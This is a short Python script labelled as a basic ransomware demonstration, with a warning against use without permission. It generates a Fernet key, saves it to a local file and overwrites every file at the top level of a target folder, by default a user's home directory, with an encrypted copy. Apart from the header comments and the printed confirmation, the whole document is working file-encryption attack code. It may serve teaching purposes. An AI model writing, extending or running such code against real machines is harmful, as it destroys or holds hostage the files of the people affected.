# This is strictly a basic demonstration to illustrate how ransomware attacks are conducted. 
# DO NOT ATTEMPT TO USE ON ANY MACHINE WITHOUT PERMISSION

from cryptography.fernet import Fernet
import os

# === Settings ===
TARGET_FOLDER = "/home/USERNAME"  # Linux
# TARGET_FOLDER = "C:\\testdata"  # Windows

# === Step 1: Generate and save key ===
key = Fernet.generate_key()
with open("encryption.key", "wb") as key_file:
    key_file.write(key)

cipher = Fernet(key)

# === Step 2: Encrypt files ===
for filename in os.listdir(TARGET_FOLDER):
    filepath = os.path.join(TARGET_FOLDER, filename)
    if os.path.isfile(filepath):
        with open(filepath, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath, "wb") as f:
            f.write(encrypted)

print("Files encrypted. Key saved to 'encryption.key'.")
